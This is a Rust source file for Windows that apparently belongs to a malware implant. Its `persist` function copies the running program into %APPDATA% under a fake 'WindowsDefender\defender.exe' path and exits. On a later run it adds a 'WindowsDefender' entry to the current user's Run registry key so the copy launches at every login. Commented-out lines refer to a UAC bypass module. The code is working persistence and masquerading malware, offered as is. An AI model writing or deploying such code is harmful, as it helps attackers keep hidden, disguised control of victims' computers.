#[cfg(target_os = "windows")]

use winreg::enums::{*};
use winreg::RegKey;
use winreg::enums;
use std::path::{Path, PathBuf};
use std::env;
use std::fs;
use std::process;
//#[cfg(target_os = "windows")]
//use uac_bypass;
/// Target subpath inside APPDATA
const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";

#[cfg(target_os = "windows")]
pub fn persist(is_dll:bool) -> std::io::Result<()> {
    // Resolve %APPDATA%
    if is_dll{
        return Ok(())
    }
    let appdata = env::var("APPDATA")
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;

    let target_path: PathBuf = Path::new(&appdata).join(TARGET_SUBPATH);    
    // Ensure directory exists
    if let Some(dir) = target_path.parent() {
        fs::create_dir_all(dir)?;
    }

    // Current executable
    let current_exe = env::current_exe()?;

    // Copy itself if not already there
    if current_exe != target_path {
        fs::copy(&current_exe, &target_path)?;
        //uac_bypass::launch_with_fsr_disabled(&target_path.to_string_lossy().to_string())?;
        std::process::exit(0);
    }
    // Registry persistence
    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;

    key.set_value("WindowsDefender", &target_path.to_string_lossy().to_string())?;

    println!("Persistence registered at {:?}", target_path);

    Ok(())
}
